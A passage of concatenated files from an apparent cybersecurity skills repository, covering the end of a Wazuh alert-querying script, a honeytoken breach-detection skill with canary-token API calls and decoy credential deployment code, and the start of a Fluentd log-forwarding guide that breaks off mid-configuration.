                "severity": "medium", "type": "Disconnected Agents",
                "detail": f"{len(disconnected)} agents disconnected",
            })
        return agents

    def get_agent_summary(self):
        """Get agent status summary counts."""
        data = self._api("GET", "/agents/summary/status")
        if data:
            return data.get("data", {})
        return {}

    def query_alerts(self, limit=20, level_min=10):
        """Query recent high-severity alerts."""
        data = self._api("GET", "/alerts", params={
            "limit": limit, "sort": "-timestamp",
            "q": f"rule.level>={level_min}",
        })
        if not data:
            return []
        alerts = data.get("data", {}).get("affected_items", [])
        return [{
            "id": a.get("id"),
            "timestamp": a.get("timestamp"),
            "rule_id": a.get("rule", {}).get("id"),
            "rule_description": a.get("rule", {}).get("description"),
            "rule_level": a.get("rule", {}).get("level"),
            "agent_name": a.get("agent", {}).get("name"),
            "agent_id": a.get("agent", {}).get("id"),
        } for a in alerts]

    def get_rules_summary(self):
        """Get summary of active detection rules."""
        data = self._api("GET", "/rules", params={"limit": 500, "select": "id,description,level,groups"})
        if not data:
            return {"total": 0}
        rules = data.get("data", {}).get("affected_items", [])
        total = data.get("data", {}).get("total_affected_items", len(rules))
        levels = {}
        for r in rules:
            lvl = str(r.get("level", 0))
            levels[lvl] = levels.get(lvl, 0) + 1
        return {"total_rules": total, "by_level": levels}

    def test_logtest(self, log_line, log_format="syslog"):
        """Test a log line against Wazuh decoders and rules."""
        data = self._api("PUT", "/logtest", data={
            "log_format": log_format,
            "location": "test",
            "event": log_line,
        })
        if not data:
            return {"error": "Logtest failed"}
        result = data.get("data", {})
        return {
            "decoder": result.get("decoder", {}).get("name"),
            "rule_id": result.get("rule", {}).get("id"),
            "rule_description": result.get("rule", {}).get("description"),
            "rule_level": result.get("rule", {}).get("level"),
            "output": result.get("output"),
        }

    def check_vulnerability_detection(self):
        """Check if vulnerability detection module is enabled."""
        data = self._api("GET", "/manager/configuration",
                         params={"section": "vulnerability-detector"})
        if data:
            config = data.get("data", {}).get("affected_items", [])
            if config:
                enabled = config[0].get("vulnerability-detector", {}).get("enabled", "no")
                if enabled != "yes":
                    self.findings.append({
                        "severity": "medium", "type": "Vuln Detection Disabled",
                        "detail": "Vulnerability detection module is not enabled",
                    })
                return {"enabled": enabled == "yes"}
        return {"enabled": False}

    def generate_report(self):
        agents = self.list_agents()
        summary = self.get_agent_summary()
        alerts = self.query_alerts()
        rules = self.get_rules_summary()
        vuln_det = self.check_vulnerability_detection()

        report = {
            "report_date": datetime.utcnow().isoformat(),
            "wazuh_url": self.base_url,
            "agent_summary": summary,
            "agents": agents[:50],
            "total_agents": len(agents),
            "recent_critical_alerts": alerts,
            "rules_summary": rules,
            "vulnerability_detection": vuln_det,
            "findings": self.findings,
            "total_findings": len(self.findings),
        }
        out = self.output_dir / "wazuh_detection_report.json"
        with open(out, "w") as f:
            json.dump(report, f, indent=2, default=str)
        print(json.dumps(report, indent=2, default=str))
        return report


def main():
    parser = argparse.ArgumentParser(
        description="Manage Wazuh endpoint detection and query alerts"
    )
    parser.add_argument("wazuh_url", help="Wazuh API URL (e.g. https://wazuh:55000)")
    parser.add_argument("--username", default="wazuh-wui", help="API username")
    parser.add_argument("--password", required=True, help="API password")
    parser.add_argument("--output-dir", default="./wazuh_detection")
    args = parser.parse_args()

    os.makedirs(args.output_dir, exist_ok=True)
    agent = WazuhDetectionAgent(args.wazuh_url, args.username, args.password,
                                output_dir=args.output_dir)
    agent.generate_report()


if __name__ == "__main__":
    main()

===== END FILE =====


===== FILE: skills/implementing-honeytokens-for-breach-detection/SKILL.md =====
---
name: implementing-honeytokens-for-breach-detection
description: 'Deploys canary tokens and honeytokens (fake AWS credentials, DNS canaries,
  document beacons, database records) that trigger alerts when accessed by attackers.
  Uses the Canarytokens API and custom webhook integrations for breach detection.
  Use when building deception-based early warning systems for intrusion detection.

  '
domain: cybersecurity
subdomain: security-operations
tags:
- deception-technology
- honeytokens
- canary-tokens
- breach-detection
- dns-canary
- security-operations
version: '1.0'
author: mahipal
license: Apache-2.0
nist_csf:
- DE.CM-01
- RS.MA-01
- GV.OV-01
- DE.AE-02
mitre_attack:
- T1078
- T1190
- T1059
- T1003
- T1110
---

# Implementing Honeytokens for Breach Detection


## When to Use

- When deploying or configuring implementing honeytokens for breach detection capabilities in your environment
- When establishing security controls aligned to compliance requirements
- When building or improving security architecture for this domain
- When conducting security assessments that require this implementation

## Prerequisites

- Familiarity with security operations concepts and tools
- Access to a test or lab environment for safe execution
- Python 3.8+ with required dependencies installed
- Appropriate authorization for any testing activities

## Instructions

Deploy honeytokens across critical systems to detect unauthorized access. Each token
type alerts via webhook when triggered by an attacker.

```python
import requests

# Create a DNS canary token via Canarytokens
resp = requests.post("https://canarytokens.org/generate", data={
    "type": "dns",
    "email": "soc@company.com",
    "memo": "Production DB server honeytoken",
})
token = resp.json()
print(f"DNS token: {token['hostname']}")
```

Token types to deploy:
1. AWS credential files (~/.aws/credentials) with canary keys
2. DNS tokens embedded in configuration files
3. Document beacons (Word/PDF) in sensitive file shares
4. Database honeytoken records in user tables
5. Web bugs in internal wiki/documentation pages

## Examples

```python
# Generate a fake AWS credentials file with canary token
aws_creds = f"[default]\naws_access_key_id = {canary_key_id}\naws_secret_access_key = {canary_secret}\n"
with open("/opt/backup/.aws/credentials", "w") as f:
    f.write(aws_creds)
```

===== END FILE =====


===== FILE: skills/implementing-honeytokens-for-breach-detection/LICENSE =====

                                 Apache License
                           Version 2.0, January 2004
                        http://www.apache.org/licenses/

   TERMS AND CONDITIONS FOR USE, REPRODUCTION, AND DISTRIBUTION

   1. Definitions.

      "License" shall mean the terms and conditions for use, reproduction,
      and distribution as defined by Sections 1 through 9 of this document.

      "Licensor" shall mean the copyright owner or entity authorized by
      the copyright owner that is granting the License.

      "Legal Entity" shall mean the union of the acting entity and all
      other entities that control, are controlled by, or are under common
      control with that entity. For the purposes of this definition,
      "control" means (i) the power, direct or indirect, to cause the
      direction or management of such entity, whether by contract or
      otherwise, or (ii) ownership of fifty percent (50%) or more of the
      outstanding shares, or (iii) beneficial ownership of such entity.

      "You" (or "Your") shall mean an individual or Legal Entity
      exercising permissions granted by this License.

      "Source" form shall mean the preferred form for making modifications,
      including but not limited to software source code, documentation
      source, and configuration files.

      "Object" form shall mean any form resulting from mechanical
      transformation or translation of a Source form, including but
      not limited to compiled object code, generated documentation,
      and conversions to other media types.

      "Work" shall mean the work of authorship, whether in Source or
      Object form, made available under the License, as indicated by a
      copyright notice that is included in or attached to the work
      (an example is provided in the Appendix below).

      "Derivative Works" shall mean any work, whether in Source or Object
      form, that is based on (or derived from) the Work and for which the
      editorial revisions, annotations, elaborations, or other modifications
      represent, as a whole, an original work of authorship. For the purposes
      of this License, Derivative Works shall not include works that remain
      separable from, or merely link (or bind by name) to the interfaces of,
      the Work and Derivative Works thereof.

      "Contribution" shall mean any work of authorship, including
      the original version of the Work and any modifications or additions
      to that Work or Derivative Works thereof, that is intentionally
      submitted to the Licensor for inclusion in the Work by the copyright owner
      or by an individual or Legal Entity authorized to submit on behalf of
      the copyright owner. For the purposes of this definition, "submitted"
      means any form of electronic, verbal, or written communication sent
      to the Licensor or its representatives, including but not limited to
      communication on electronic mailing lists, source code control systems,
      and issue tracking systems that are managed by, or on behalf of, the
      Licensor for the purpose of discussing and improving the Work, but
      excluding communication that is conspicuously marked or otherwise
      designated in writing by the copyright owner as "Not a Contribution."

      "Contributor" shall mean Licensor and any individual or Legal Entity
      on behalf of whom a Contribution has been received by the Licensor and
      subsequently incorporated within the Work.

   2. Grant of Copyright License. Subject to the terms and conditions of
      this License, each Contributor hereby grants to You a perpetual,
      worldwide, non-exclusive, no-charge, royalty-free, irrevocable
      copyright license to reproduce, prepare Derivative Works of,
      publicly display, publicly perform, sublicense, and distribute the
      Work and such Derivative Works in Source or Object form.

   3. Grant of Patent License. Subject to the terms and conditions of
      this License, each Contributor hereby grants to You a perpetual,
      worldwide, non-exclusive, no-charge, royalty-free, irrevocable
      (except as stated in this section) patent license to make, have made,
      use, offer to sell, sell, import, and otherwise transfer the Work,
      where such license applies only to those patent claims licensable
      by such Contributor that are necessarily infringed by their
      Contribution(s) alone or by combination of their Contribution(s)
      with the Work to which such Contribution(s) was submitted. If You
      institute patent litigation against any entity (including a
      cross-claim or counterclaim in a lawsuit) alleging that the Work
      or a Contribution incorporated within the Work constitutes direct
      or contributory patent infringement, then any patent licenses
      granted to You under this License for that Work shall terminate
      as of the date such litigation is filed.

   4. Redistribution. You may reproduce and distribute copies of the
      Work or Derivative Works thereof in any medium, with or without
      modifications, and in Source or Object form, provided that You
      meet the following conditions:

      (a) You must give any other recipients of the Work or
          Derivative Works a copy of this License; and

      (b) You must cause any modified files to carry prominent notices
          stating that You changed the files; and

      (c) You must retain, in the Source form of any Derivative Works
          that You distribute, all copyright, patent, trademark, and
          attribution notices from the Source form of the Work,
          excluding those notices that do not pertain to any part of
          the Derivative Works; and

      (d) If the Work includes a "NOTICE" text file as part of its
          distribution, then any Derivative Works that You distribute must
          include a readable copy of the attribution notices contained
          within such NOTICE file, excluding any notices that do not
          pertain to any part of the Derivative Works, in at least one
          of the following places: within a NOTICE text file distributed
          as part of the Derivative Works; within the Source form or
          documentation, if provided along with the Derivative Works; or,
          within a display generated by the Derivative Works, if and
          wherever such third-party notices normally appear. The contents
          of the NOTICE file are for informational purposes only and
          do not modify the License. You may add Your own attribution
          notices within Derivative Works that You distribute, alongside
          or as an addendum to the NOTICE text from the Work, provided
          that such additional attribution notices cannot be construed
          as modifying the License.

      You may add Your own copyright statement to Your modifications and
      may provide additional or different license terms and conditions
      for use, reproduction, or distribution of Your modifications, or
      for any such Derivative Works as a whole, provided Your use,
      reproduction, and distribution of the Work otherwise complies with
      the conditions stated in this License.

   5. Submission of Contributions. Unless You explicitly state otherwise,
      any Contribution intentionally submitted for inclusion in the Work
      by You to the Licensor shall be under the terms and conditions of
      this License, without any additional terms or conditions.
      Notwithstanding the above, nothing herein shall supersede or modify
      the terms of any separate license agreement you may have executed
      with Licensor regarding such Contributions.

   6. Trademarks. This License does not grant permission to use the trade
      names, trademarks, service marks, or product names of the Licensor,
      except as required for reasonable and customary use in describing the
      origin of the Work and reproducing the content of the NOTICE file.

   7. Disclaimer of Warranty. Unless required by applicable law or
      agreed to in writing, Licensor provides the Work (and each
      Contributor provides its Contributions) on an "AS IS" BASIS,
      WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or
      implied, including, without limitation, any warranties or conditions
      of TITLE, NON-INFRINGEMENT, MERCHANTABILITY, or FITNESS FOR A
      PARTICULAR PURPOSE. You are solely responsible for determining the
      appropriateness of using or redistributing the Work and assume any
      risks associated with Your exercise of permissions under this License.

   8. Limitation of Liability. In no event and under no legal theory,
      whether in tort (including negligence), contract, or otherwise,
      unless required by applicable law (such as deliberate and grossly
      negligent acts) or agreed to in writing, shall any Contributor be
      liable to You for damages, including any direct, indirect, special,
      incidental, or consequential damages of any character arising as a
      result of this License or out of the use or inability to use the
      Work (including but not limited to damages for loss of goodwill,
      work stoppage, computer failure or malfunction, or any and all
      other commercial damages or losses), even if such Contributor
      has been advised of the possibility of such damages.

   9. Accepting Warranty or Additional Liability. While redistributing
      the Work or Derivative Works thereof, You may choose to offer,
      and charge a fee for, acceptance of support, warranty, indemnity,
      or other liability obligations and/or rights consistent with this
      License. However, in accepting such obligations, You may act only
      on Your own behalf and on Your sole responsibility, not on behalf
      of any other Contributor, and only if You agree to indemnify,
      defend, and hold each Contributor harmless for any liability
      incurred by, or claims asserted against, such Contributor by reason
      of your accepting any such warranty or additional liability.

   END OF TERMS AND CONDITIONS

   APPENDIX: How to apply the Apache License to your work.

      To apply the Apache License to your work, attach the following
      boilerplate notice, with the fields enclosed by brackets "[]"
      replaced with your own identifying information. (Don't include
      the brackets!)  The text should be enclosed in the appropriate
      comment syntax for the file format. Please do not remove or change
      the license header comment from a contributed file except when
      necessary.

   Copyright 2026 mukul975

   Licensed under the Apache License, Version 2.0 (the "License");
   you may not use this file except in compliance with the License.
   You may obtain a copy of the License at

       http://www.apache.org/licenses/LICENSE-2.0

   Unless required by applicable law or agreed to in writing, software
   distributed under the License is distributed on an "AS IS" BASIS,
   WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
   See the License for the specific language governing permissions and
   limitations under the License.

===== END FILE =====


===== FILE: skills/implementing-honeytokens-for-breach-detection/references/api-reference.md =====
# API Reference: Implementing Honeytokens for Breach Detection

## Canarytokens.org API

```python
import requests

# Create DNS canary token
resp = requests.post("https://canarytokens.org/generate", data={
    "type": "dns",
    "email": "soc@company.com",
    "memo": "Prod DB honeytoken",
    "webhook_url": "https://hooks.slack.com/...",  # optional
})
token = resp.json()  # {"hostname": "xxx.canarytokens.com", ...}

# Available token types
# dns, web_image, aws_keys, cloned_web, doc_msword,
# slack_api, svn, sql_server, qr_code
```

## Token Deployment Locations

| Type | Location | Trigger |
|------|----------|---------|
| AWS keys | `~/.aws/credentials` | Key used in API call |
| DNS | Config files, code | DNS resolution |
| Web image | Wiki, docs, shares | Image HTTP request |
| Document | File shares | Document opened |
| Database | User/config tables | Record queried |

## Webhook Alert Payload

```json
{
  "manage_url": "https://canarytokens.org/manage?...",
  "memo": "Production honeytoken",
  "additional_data": {
    "src_ip": "203.0.113.50",
    "useragent": "..."
  },
  "channel": "DNS",
  "time": "2025-01-15 14:23:00"
}
```

## Thinkst Canary API (Enterprise)

```python
# List triggered tokens
resp = requests.get("https://console.canary.tools/api/v1/canarytokens/alerts",
    params={"auth_token": "<api_key>"})
```

### References

- Canarytokens: https://canarytokens.org/
- Thinkst Canary: https://canary.tools/
- LOLBAS honeytoken guide: https://zeltser.com/honeytokens-canarytokens-setup/

===== END FILE =====


===== FILE: skills/implementing-honeytokens-for-breach-detection/scripts/agent.py =====
#!/usr/bin/env python3
"""Agent for deploying and managing honeytokens for breach detection."""

import os
import json
import uuid
import hashlib
import argparse
from datetime import datetime

import re

import requests

_SAFE_TABLE_RE = re.compile(r'^[a-zA-Z_][a-zA-Z0-9_]*$')


def create_dns_canarytoken(email, memo, webhook_url=None):
    """Create a DNS canary token via Canarytokens.org API."""
    data = {
        "type": "dns",
        "email": email,
        "memo": memo,
    }
    if webhook_url:
        data["webhook_url"] = webhook_url
    resp = requests.post("https://canarytokens.org/generate", data=data, timeout=15)
    resp.raise_for_status()
    return resp.json()


def create_web_bug_token(email, memo, webhook_url=None):
    """Create a web bug (image beacon) canary token."""
    data = {
        "type": "web_image",
        "email": email,
        "memo": memo,
    }
    if webhook_url:
        data["webhook_url"] = webhook_url
    resp = requests.post("https://canarytokens.org/generate", data=data, timeout=15)
    resp.raise_for_status()
    return resp.json()


def create_aws_key_token(email, memo, webhook_url=None):
    """Create an AWS credential canary token."""
    data = {
        "type": "aws_keys",
        "email": email,
        "memo": memo,
    }
    if webhook_url:
        data["webhook_url"] = webhook_url
    resp = requests.post("https://canarytokens.org/generate", data=data, timeout=15)
    resp.raise_for_status()
    return resp.json()


def generate_honeytoken_id():
    """Generate a unique honeytoken identifier."""
    return f"HT-{uuid.uuid4().hex[:12].upper()}"


def deploy_aws_credential_token(target_path, canary_key_id, canary_secret):
    """Deploy fake AWS credentials file as a honeytoken."""
    content = (
        "[default]\n"
        f"aws_access_key_id = {canary_key_id}\n"
        f"aws_secret_access_key = {canary_secret}\n"
        "region = us-east-1\n"
    )
    os.makedirs(os.path.dirname(target_path), exist_ok=True)
    with open(target_path, "w") as f:
        f.write(content)
    return {
        "type": "aws_credentials",
        "path": target_path,
        "token_id": generate_honeytoken_id(),
        "deployed_at": datetime.utcnow().isoformat(),
    }


def deploy_database_honeytoken(db_connection_string, table_name="users"):
    """Generate SQL to insert honeytoken records into a database."""
    if not _SAFE_TABLE_RE.match(table_name):
        raise ValueError(f"Invalid table name: {table_name!r}")
    token_id = generate_honeytoken_id()
    fake_users = [
        {
            "username": "svc_backup_admin",
            "email": f"{token_id}@canary.internal",
            "role": "admin",
            "api_key": hashlib.sha256(token_id.encode()).hexdigest()[:40],
        },
        {
            "username": "emergency_break_glass",
            "email": f"bg-{token_id}@canary.internal",
            "role": "superadmin",
            "api_key": hashlib.sha256(f"bg-{token_id}".encode()).hexdigest()[:40],
        },
    ]
    sql_statements = []
    for user in fake_users:
        sql = (
            f"INSERT INTO [{table_name}] (username, email, role, api_key) "
            "VALUES (?, ?, ?, ?);"
        )
        sql_statements.append({
            "query": sql,
            "params": [user["username"], user["email"], user["role"], user["api_key"]],
        })
    return {"token_id": token_id, "sql_statements": sql_statements, "records": fake_users}


def deploy_dns_token_in_config(config_path, dns_hostname, key_name="backup_server"):
    """Embed a DNS canary token in a configuration file."""
    config_entry = f"{key_name} = {dns_hostname}\n"
    with open(config_path, "a") as f:
        f.write(f"\n# Backup configuration\n{config_entry}")
    return {
        "type": "dns_config",
        "config_path": config_path,
        "dns_hostname": dns_hostname,
        "deployed_at": datetime.utcnow().isoformat(),
    }


def create_deployment_plan(target_environment):
    """Create a honeytoken deployment plan for an environment."""
    plan = {
        "environment": target_environment,
        "tokens": [
            {"type": "aws_credentials", "location": "/opt/backup/.aws/credentials",
             "description": "Fake AWS creds in backup directory"},
            {"type": "dns", "location": "/etc/app/config.yml",
             "description": "DNS canary in app config"},
            {"type": "database", "location": "users table",
             "description": "Honeytoken admin accounts"},
            {"type": "web_bug", "location": "internal wiki",
             "description": "Image beacon in sensitive docs"},
            {"type": "dns", "location": "/root/.ssh/config",
             "description": "DNS canary in SSH config"},
        ],
    }
    return plan


def check_token_alerts(webhook_log_path):
    """Parse webhook logs to check for honeytoken trigger alerts."""
    if not os.path.exists(webhook_log_path):
        return []
    with open(webhook_log_path) as f:
        logs = json.load(f)
    alerts = []
    for entry in logs:
        if entry.get("type") == "canarytoken_triggered":
            alerts.append({
                "token_memo": entry.get("memo", ""),
                "source_ip": entry.get("src_ip", ""),
                "triggered_at": entry.get("time", ""),
                "token_type": entry.get("token_type", ""),
            })
    return alerts


def main():
    parser = argparse.ArgumentParser(description="Honeytoken Deployment Agent")
    parser.add_argument("--email", default=os.getenv("CANARY_EMAIL", "soc@company.com"))
    parser.add_argument("--webhook", default=os.getenv("CANARY_WEBHOOK"))
    parser.add_argument("--output", default="honeytoken_report.json")
    parser.add_argument("--action", choices=[
        "create_dns", "create_aws", "create_web", "plan", "full_deploy"
    ], default="plan")
    args = parser.parse_args()

    report = {"generated_at": datetime.utcnow().isoformat(), "tokens": {}}

    if args.action == "plan":
        plan = create_deployment_plan("production")
        report["deployment_plan"] = plan
        print(f"[+] Deployment plan: {len(plan['tokens'])} tokens")

    if args.action in ("create_dns", "full_deploy"):
        token = create_dns_canarytoken(args.email, "Production honeytoken", args.webhook)
        report["tokens"]["dns"] = token
        print(f"[+] DNS canary token created")

    if args.action in ("create_aws", "full_deploy"):
        token = create_aws_key_token(args.email, "AWS credential honeytoken", args.webhook)
        report["tokens"]["aws"] = token
        print(f"[+] AWS credential token created")

    if args.action in ("create_web", "full_deploy"):
        token = create_web_bug_token(args.email, "Web beacon honeytoken", args.webhook)
        report["tokens"]["web_bug"] = token
        print(f"[+] Web bug token created")

    with open(args.output, "w") as f:
        json.dump(report, f, indent=2, default=str)
    print(f"[+] Report saved to {args.output}")


if __name__ == "__main__":
    main()

===== END FILE =====


===== FILE: skills/implementing-log-forwarding-with-fluentd/SKILL.md =====
---
name: implementing-log-forwarding-with-fluentd
description: >-
  Configures Fluent Bit as an endpoint log forwarder and Fluentd as the central
  aggregator for centralized log collection, routing, filtering, and enrichment,
  covering input plugins for syslog/file-tailing/application logs and output
  routing to Elasticsearch, S3, and Splunk. Use when setting up centralized log
  aggregation across distributed infrastructure or generating Fluent Bit/Fluentd
  configuration files for a new log pipeline.
domain: cybersecurity
subdomain: security-operations
tags:
- fluentd
- fluent-bit
- log-aggregation
- log-forwarding
- siem
- centralized-logging
- observability
version: '1.0'
author: mahipal
license: Apache-2.0
nist_csf:
- DE.CM-01
- RS.MA-01
- GV.OV-01
- DE.AE-02
mitre_attack:
- T1078
- T1190
- T1059
- T1685.002
- T1685.005
---

# Implementing Log Forwarding with Fluentd

## Overview

This skill covers configuring Fluentd and Fluent Bit for centralized log collection, routing, and enrichment. Fluent Bit acts as a lightweight log forwarder on endpoints, while Fluentd serves as the central aggregator and processor. The configuration covers input plugins for syslog, file tailing, and application logs, with output routing to Elasticsearch, S3, and Splunk.


## When to Use

- When deploying or configuring implementing log forwarding with fluentd capabilities in your environment
- When establishing security controls aligned to compliance requirements
- When building or improving security architecture for this domain
- When conducting security assessments that require this implementation

## Prerequisites

- Fluentd (td-agent) v1.16+ or Fluent Bit v3.0+
- Python 3.8+ with fluent-logger library
- Elasticsearch or Splunk for log destination
- Network access on port 24224 (Fluentd forward protocol)
- Ruby 2.7+ (for Fluentd plugin development)

## Steps

1. **Generate Fluent Bit Configuration** — Create input, filter, and output configuration for endpoint log collection
2. **Generate Fluentd Aggregator Configuration** — Configure the central Fluentd instance with forward input, parsing, and multi-output routing
3. **Configure Log Filtering and Enrichment** — Add record_transformer and grep filters for log enrichment and noise reduction
4. **Validate Configuration Syntax** — Parse and validate Fluentd/Fluent Bit configuration files for syntax errors
5. **Test Log Forwarding** — Send test events via fluent-logger Python library and verify delivery
6. **Generate Deployment Report** — Produce configuration summary with routing topology and health metrics

## Expected Output

- Fluent Bit and Fluentd configuration files (INI/YAML format)
- Configuration validation report
- Log routing topology diagram (text-based)
- Test event delivery confirmation

===== END FILE =====


===== FILE: skills/implementing-log-forwarding-with-fluentd/LICENSE =====

                                 Apache License
                           Version 2.0, January 2004
                        http://www.apache.org/licenses/

   TERMS AND CONDITIONS FOR USE, REPRODUCTION, AND DISTRIBUTION

   1. Definitions.

      "License" shall mean the terms and conditions for use, reproduction,
      and distribution as defined by Sections 1 through 9 of this document.

      "Licensor" shall mean the copyright owner or entity authorized by
      the copyright owner that is granting the License.

      "Legal Entity" shall mean the union of the acting entity and all
      other entities that control, are controlled by, or are under common
      control with that entity. For the purposes of this definition,
      "control" means (i) the power, direct or indirect, to cause the
      direction or management of such entity, whether by contract or
      otherwise, or (ii) ownership of fifty percent (50%) or more of the
      outstanding shares, or (iii) beneficial ownership of such entity.

      "You" (or "Your") shall mean an individual or Legal Entity
      exercising permissions granted by this License.

      "Source" form shall mean the preferred form for making modifications,
      including but not limited to software source code, documentation
      source, and configuration files.

      "Object" form shall mean any form resulting from mechanical
      transformation or translation of a Source form, including but
      not limited to compiled object code, generated documentation,
      and conversions to other media types.

      "Work" shall mean the work of authorship, whether in Source or
      Object form, made available under the License, as indicated by a
      copyright notice that is included in or attached to the work
      (an example is provided in the Appendix below).

      "Derivative Works" shall mean any work, whether in Source or Object
      form, that is based on (or derived from) the Work and for which the
      editorial revisions, annotations, elaborations, or other modifications
      represent, as a whole, an original work of authorship. For the purposes
      of this License, Derivative Works shall not include works that remain
      separable from, or merely link (or bind by name) to the interfaces of,
      the Work and Derivative Works thereof.

      "Contribution" shall mean any work of authorship, including
      the original version of the Work and any modifications or additions
      to that Work or Derivative Works thereof, that is intentionally
      submitted to the Licensor for inclusion in the Work by the copyright owner
      or by an individual or Legal Entity authorized to submit on behalf of
      the copyright owner. For the purposes of this definition, "submitted"
      means any form of electronic, verbal, or written communication sent
      to the Licensor or its representatives, including but not limited to
      communication on electronic mailing lists, source code control systems,
      and issue tracking systems that are managed by, or on behalf of, the
      Licensor for the purpose of discussing and improving the Work, but
      excluding communication that is conspicuously marked or otherwise
      designated in writing by the copyright owner as "Not a Contribution."

      "Contributor" shall mean Licensor and any individual or Legal Entity
      on behalf of whom a Contribution has been received by the Licensor and
      subsequently incorporated within the Work.

   2. Grant of Copyright License. Subject to the terms and conditions of
      this License, each Contributor hereby grants to You a perpetual,
      worldwide, non-exclusive, no-charge, royalty-free, irrevocable
      copyright license to reproduce, prepare Derivative Works of,
      publicly display, publicly perform, sublicense, and distribute the
      Work and such Derivative Works in Source or Object form.

   3. Grant of Patent License. Subject to the terms and conditions of
      this License, each Contributor hereby grants to You a perpetual,
      worldwide, non-exclusive, no-charge, royalty-free, irrevocable
      (except as stated in this section) patent license to make, have made,
      use, offer to sell, sell, import, and otherwise transfer the Work,
      where such license applies only to those patent claims licensable
      by such Contributor that are necessarily infringed by their
      Contribution(s) alone or by combination of their Contribution(s)
      with the Work to which such Contribution(s) was submitted. If You
      institute patent litigation against any entity (including a
      cross-claim or counterclaim in a lawsuit) alleging that the Work
      or a Contribution incorporated within the Work constitutes direct
      or contributory patent infringement, then any patent licenses
      granted to You under this License for that Work shall terminate
      as of the date such litigation is filed.

   4. Redistribution. You may reproduce and distribute copies of the
      Work or Derivative Works thereof in any medium, with or without
      modifications, and in Source or Object form, provided that You
      meet the following conditions:

      (a) You must give any other recipients of the Work or
          Derivative Works a copy of this License; and

      (b) You must cause any modified files to carry prominent notices
          stating that You changed the files; and

      (c) You must retain, in the Source form of any Derivative Works
          that You distribute, all copyright, patent, trademark, and
          attribution notices from the Source form of the Work,
          excluding those notices that do not pertain to any part of
          the Derivative Works; and

      (d) If the Work includes a "NOTICE" text file as part of its
          distribution, then any Derivative Works that You distribute must
          include a readable copy of the attribution notices contained
          within such NOTICE file, excluding any notices that do not
          pertain to any part of the Derivative Works, in at least one
          of the following places: within a NOTICE text file distributed
          as part of the Derivative Works; within the Source form or
          documentation, if provided along with the Derivative Works; or,
          within a display generated by the Derivative Works, if and
          wherever such third-party notices normally appear. The contents
          of the NOTICE file are for informational purposes only and
          do not modify the License. You may add Your own attribution
          notices within Derivative Works that You distribute, alongside
          or as an addendum to the NOTICE text from the Work, provided
          that such additional attribution notices cannot be construed
          as modifying the License.

      You may add Your own copyright statement to Your modifications and
      may provide additional or different license terms and conditions
      for use, reproduction, or distribution of Your modifications, or
      for any such Derivative Works as a whole, provided Your use,
      reproduction, and distribution of the Work otherwise complies with
      the conditions stated in this License.

   5. Submission of Contributions. Unless You explicitly state otherwise,
      any Contribution intentionally submitted for inclusion in the Work
      by You to the Licensor shall be under the terms and conditions of
      this License, without any additional terms or conditions.
      Notwithstanding the above, nothing herein shall supersede or modify
      the terms of any separate license agreement you may have executed
      with Licensor regarding such Contributions.

   6. Trademarks. This License does not grant permission to use the trade
      names, trademarks, service marks, or product names of the Licensor,
      except as required for reasonable and customary use in describing the
      origin of the Work and reproducing the content of the NOTICE file.

   7. Disclaimer of Warranty. Unless required by applicable law or
      agreed to in writing, Licensor provides the Work (and each
      Contributor provides its Contributions) on an "AS IS" BASIS,
      WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or
      implied, including, without limitation, any warranties or conditions
      of TITLE, NON-INFRINGEMENT, MERCHANTABILITY, or FITNESS FOR A
      PARTICULAR PURPOSE. You are solely responsible for determining the
      appropriateness of using or redistributing the Work and assume any
      risks associated with Your exercise of permissions under this License.

   8. Limitation of Liability. In no event and under no legal theory,
      whether in tort (including negligence), contract, or otherwise,
      unless required by applicable law (such as deliberate and grossly
      negligent acts) or agreed to in writing, shall any Contributor be
      liable to You for damages, including any direct, indirect, special,
      incidental, or consequential damages of any character arising as a
      result of this License or out of the use or inability to use the
      Work (including but not limited to damages for loss of goodwill,
      work stoppage, computer failure or malfunction, or any and all
      other commercial damages or losses), even if such Contributor
      has been advised of the possibility of such damages.

   9. Accepting Warranty or Additional Liability. While redistributing
      the Work or Derivative Works thereof, You may choose to offer,
      and charge a fee for, acceptance of support, warranty, indemnity,
      or other liability obligations and/or rights consistent with this
      License. However, in accepting such obligations, You may act only
      on Your own behalf and on Your sole responsibility, not on behalf
      of any other Contributor, and only if You agree to indemnify,
      defend, and hold each Contributor harmless for any liability
      incurred by, or claims asserted against, such Contributor by reason
      of your accepting any such warranty or additional liability.

   END OF TERMS AND CONDITIONS

   APPENDIX: How to apply the Apache License to your work.

      To apply the Apache License to your work, attach the following
      boilerplate notice, with the fields enclosed by brackets "[]"
      replaced with your own identifying information. (Don't include
      the brackets!)  The text should be enclosed in the appropriate
      comment syntax for the file format. Please do not remove or change
      the license header comment from a contributed file except when
      necessary.

   Copyright 2026 mukul975

   Licensed under the Apache License, Version 2.0 (the "License");
   you may not use this file except in compliance with the License.
   You may obtain a copy of the License at

       http://www.apache.org/licenses/LICENSE-2.0

   Unless required by applicable law or agreed to in writing, software
   distributed under the License is distributed on an "AS IS" BASIS,
   WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
   See the License for the specific language governing permissions and
   limitations under the License.

===== END FILE =====


===== FILE: skills/implementing-log-forwarding-with-fluentd/references/api-reference.md =====
# Fluentd / Fluent Bit Log Forwarding API Reference

## Fluent Bit CLI

```bash
# Run Fluent Bit with config file
fluent-bit -c /etc/fluent-bit/fluent-bit.conf

# Validate configuration syntax
fluent-bit -c /etc/fluent-bit/fluent-bit.conf --dry-run

# Run with specific input and output (no config file)
fluent-bit -i cpu -o stdout -f 1

# Tail a log file and forward to Fluentd
fluent-bit -i tail -p path=/var/log/syslog -o forward -p host=fluentd.local -p port=24224
```

## Fluentd CLI

```bash
# Start Fluentd with config
fluentd -c /etc/fluentd/fluent.conf

# Validate config file
fluentd --dry-run -c /etc/fluentd/fluent.conf

# Install output plugin
fluent-gem install fluent-plugin-elasticsearch
fluent-gem install fluent-plugin-s3
fluent-gem install fluent-plugin-splunk-hec
```

## Fluent Bit Configuration Sections

```ini
[SERVICE]
    Flush        5
    Daemon       Off
    Log_Level    info

[INPUT]
    Name         tail
    Tag          app.logs
    Path         /var/log/app/*.log
    Parser       json
    DB           /var/log/flb_app.db

[FILTER]
    Name         record_modifier
    Match        *
    Record       hostname ${HOSTNAME}

[OUTPUT]
    Name         forward
    Match        *
    Host         aggregator.local
    Port         24224
```

## Fluentd Configuration Directives

```xml
<source>
  @type forward
  port 24224
  bind 0.0.0.0
</source>

<filter **>
  @type record_transformer
